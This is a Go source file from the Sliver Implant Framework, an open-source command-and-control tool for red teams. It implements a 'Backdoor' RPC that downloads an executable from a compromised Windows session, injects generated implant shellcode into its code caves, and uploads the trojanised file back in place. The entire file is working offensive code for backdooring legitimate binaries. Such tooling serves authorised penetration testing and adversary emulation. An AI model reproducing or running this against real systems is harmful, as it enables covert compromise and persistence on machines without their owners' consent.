package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"

	"github.com/Binject/binjection/bj"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// Backdoor - Inject a sliver payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
	resp := &sliverpb.Backdoor{}
	session := core.Sessions.Get(req.Request.SessionID)
	if session.Os != "windows" {
		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.Os))
	}
	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   int64(30),
		},
		Path: req.FilePath,
	})
	if err != nil {
		return nil, err
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, err
		}
	}

	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == req.ProfileName {
			p = prof
		}
	}
	if p.GetName() == "" {
		return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
	}

	if p.Config.Format != clientpb.OutputFormat_SHELLCODE {
		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
	}

	name, config := generate.ImplantConfigFromProtobuf(p.Config)
	fPath, err := generate.SliverShellcode(name, config)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	shellcode, err := ioutil.ReadFile(fPath)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	bjConfig := &bj.BinjectConfig{
		CodeCaveMode: true,
	}
	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	uploadGzip := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   int64(30),
		},
	})
	if err != nil {
		return nil, err
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, fmt.Errorf(upload.Response.Err)
	}

	return resp, nil
}
